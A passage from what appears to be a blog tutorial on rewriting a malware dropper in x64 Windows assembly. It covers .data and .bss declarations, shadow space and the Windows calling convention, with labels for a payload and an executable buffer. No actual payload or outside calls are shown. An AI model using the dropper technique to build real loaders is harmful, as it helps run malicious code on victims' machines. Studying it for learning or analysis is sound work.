&lt;p&gt;You may notice that our shellcode is not at the start of the &lt;code&gt;.data&lt;/code&gt; segment because there are other data that was declared prior to our payload. This is important to note as the order we declare the data will be the order they will appear in memory.&lt;/p&gt;
&lt;h2 id="initialized-data"&gt;Initialized data&lt;/h2&gt;
&lt;p&gt;All data in assembly needs to be declared and initialized before it can be used:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_hello&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Hello&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;world&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_exec_addr&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;addr&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_pload_addr&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;addr&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;msg_format&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;%&lt;/span&gt;&lt;span class="mi"&gt;-20&lt;/span&gt;&lt;span class="no"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;x&lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;-016&lt;/span&gt;&lt;span class="no"&gt;p&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_hit_me&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;Hit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;me&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xa&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_format&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_pload_addr&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is optional in C as you can pass data (like a string) directly to a function without adding it to a variable:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%-20s : 0x%-016p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;payload addr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%-20s : 0x%-016p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;exec_mem addr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;However, under the hood, the C compiler actually places these data on the &lt;code&gt;.data&lt;/code&gt; segment for you automatically. If you were to compile and run the C program you would see that the strings are in the &lt;code&gt;.data&lt;/code&gt; segment.&lt;/p&gt;
&lt;h2 id="uninitialized-data"&gt;Uninitialized data&lt;/h2&gt;
&lt;p&gt;Memory of certain sizes can be reserved so that it can be used later in a program. These unitialized data is declared not in a &lt;code&gt;.data&lt;/code&gt; segment but in a &lt;code&gt;.bss&lt;/code&gt; segment &lt;a href="https://en.wikipedia.org/wiki/.bss"&gt;(more here)&lt;/a&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;resb&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;old_protect&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;resb&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Nasm provides specific "pseudo-instructions" for declaring unitialized data like &lt;code&gt;resb&lt;/code&gt; (reserve byte), &lt;code&gt;resw&lt;/code&gt; (reserve word), and so on. &lt;/p&gt;
&lt;p&gt;Alternatively, this can be written like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.bss&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;dup&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="c1"&gt;; Reserve 8 bytes of ? null value&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;old_protect&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;dq&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="c1"&gt;; DQ = QWORD&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It would still work but NASM doesn't like it and would throw a warning.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dropper_data.asm:18:&lt;span class="w"&gt; &lt;/span&gt;warning:&lt;span class="w"&gt; &lt;/span&gt;attempt&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;initialize&lt;span class="w"&gt; &lt;/span&gt;memory&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;BSS&lt;span class="w"&gt; &lt;/span&gt;section&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;.bss&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;ignored&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;-w+other&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The memory for the uninitialized data won't be reserved until the program is loaded. Once it is, we can see the reserved memory in the &lt;code&gt;.data&lt;/code&gt; segment. &lt;/p&gt;
&lt;p&gt;Any data we move to the previously unitialized data can now be seen from a debugger. See below for an example:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Move &amp;quot;000001F96E100000&amp;quot; to memory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-04" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-04.png" /&gt;&lt;/p&gt;
&lt;h2 id="shadow-spaces"&gt;Shadow Spaces&lt;/h2&gt;
&lt;p&gt;When calling a function in x64 Windows assembly, programmers must keep in mind to reserve a "shadow space" before doing a &lt;code&gt;call&lt;/code&gt; to an external function that is in another language like C or C++. For example:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    sub     rsp, 32 
    call    getchar
    add     rsp, 32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But what is a shadow space? &lt;a href="https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly"&gt;Here&lt;/a&gt; is a quick explanation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The shadow space is the mandatory 32 bytes (4x8 bytes) you must reserve for the called procedure. It just means you must provide 32 bytes on the stack before calling.&lt;/p&gt;
&lt;p&gt;It can be used by compilers to leave a copy of the register values on the stack for later inspection in the debugger. It is meant to be used to make debugging x64 easier.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So in the code above, &lt;code&gt;sub rsp, 32&lt;/code&gt; reserves the shadow space before &lt;code&gt;getchar&lt;/code&gt; is called. The space on the stack is highlighted in the image below.&lt;/p&gt;
&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-05" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-05.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;call getchar&lt;/code&gt; then executes and the "shadow space" gets filled.&lt;/p&gt;
&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-06" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-06.png" /&gt;&lt;/p&gt;
&lt;p&gt;As the caller, we really do not care about the data that gets placed in the shadows space. So after calling the functions we do &lt;code&gt;add rsp, 32&lt;/code&gt; to reclaim the shadow space.&lt;/p&gt;
&lt;p&gt;You'll find out the importance of properly reserving and releasing a shadow space especially if you are relying on the stack for saving local variables. Here is a segment of the code where I found out first-hand the importance of handling the shadow space.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="c1"&gt;;; I need rax for later so I pushed it on the stack&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_hit_me&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;;; printf was expecting a shadow space so it just wrote onto the stack, overwriting the value from RAX before&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;getchar&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; getchar did the same too&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="c1"&gt;;; The value saved by rax is overwritten&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Simply handling the shadow space avoided this problem:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_hit_me&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is reserved&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;;; printf can write to the stack without overwriting data that I need&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is released&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is reserved&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;getchar&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; same goes with getchar&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is released&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="c1"&gt;;; I got the correct value from rax that I pushed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The above code can be further optimized by only releasing the shadow space after both call to &lt;code&gt;printf&lt;/code&gt; and &lt;code&gt;getchar&lt;/code&gt;, as shown below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rcx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;msg_hit_me&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is reserved&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="c1"&gt;;; printf can write to the stack without overwriting data that I need&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;getchar&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; same goes with getchar&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;; shadow space is released&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="c1"&gt;;; I got the correct value from rax that I pushed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;However, there might come a time when the code will change and you might forget to re-add the code that releases and reserves the shadow space. This may lead to hard-to-find stack related problems. To avoid this, just make it a habit to reserve and release the shadow space every time an external function is called.&lt;/p&gt;
&lt;p&gt;As an alternative, you can use a routine that could reserve and release the shadow space automatically like the one below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;shadow_call:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Get the return address pointer in a non-volitile register&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Add the shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;; Call the function&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;; Remove the shadow space&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;jmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rbx&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="c1"&gt;; Go back to the stored instruction address&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To call the routine, just do this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;getchar&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;shadow_call&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But honestly, I think it's less complicated to just do the handling of shadow space yourself.&lt;/p&gt;
&lt;p&gt;Shadow spaces threw me off a bit when I was researching about this, but everything I said above should be enough of an explanation. If however you want more then go &lt;a href="https://retroscience.net/x64-assembly.html"&gt;here&lt;/a&gt; and then &lt;a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="microsoft-x64-calling-convention"&gt;Microsoft x64 Calling Convention&lt;/h2&gt;
&lt;p&gt;It is also important to note that the calling convention for functions is different for Windows compared to other operating systems.&lt;/p&gt;
&lt;p&gt;As a quick reference, if you are going to pass parameters to a function you need to use registers &lt;code&gt;rcx&lt;/code&gt;, &lt;code&gt;rdx&lt;/code&gt;, &lt;code&gt;r8&lt;/code&gt;, and &lt;code&gt;r9&lt;/code&gt; for the first, second, third, and fourth parameters respectively.&lt;/p&gt;
&lt;p&gt;Here's an example from our code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;// Make new buffer as executable&lt;/span&gt;
